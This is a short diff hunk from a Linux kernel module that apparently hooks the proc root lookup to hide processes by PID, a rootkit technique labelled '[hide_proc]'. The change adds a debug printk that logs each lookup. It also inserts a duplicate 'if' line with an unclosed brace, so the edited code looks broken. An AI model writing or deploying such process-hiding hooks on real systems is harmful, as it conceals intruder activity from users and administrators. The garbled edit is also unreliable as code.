@@ -143,6 +143,11 @@ static struct dentry * hooked_proc_root_lookup(struct inode *dir, struct dentry 
     long pid;
     const char *name;
 
+    printk(KERN_INFO "[hide_proc] lookup called for '%s' by process '%s'\n", dentry->d_name.name, current->comm);
+
+    if (dentry && dentry->d_name.name) {
+
+
     if (dentry && dentry->d_name.name) {
         name = dentry->d_name.name;
         pid = simple_strtol(name, &endptr, 10);
